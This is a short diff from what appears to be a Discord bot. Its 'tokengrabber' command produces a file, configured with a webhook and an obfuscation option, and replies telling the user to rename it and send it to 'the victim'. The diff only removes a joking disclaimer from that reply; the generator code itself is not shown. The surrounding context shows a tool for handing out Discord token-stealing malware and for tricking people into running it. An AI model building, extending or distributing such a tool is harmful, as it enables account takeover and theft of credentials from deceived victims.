@@ -678,7 +678,7 @@ async def tokengrabber(ctx, webhook, obfus):
     file = discord.File(file_object, filename='tokengrabber.py')
 
     
-    await ctx.reply(file=file, content='Rename this and send it to the victim. The victim must have python installed. [Do not run the file if you dont trust me :fearful:]')
+    await ctx.reply(file=file, content='Rename this and send it to the victim. The victim must have python installed.')
 
 
 
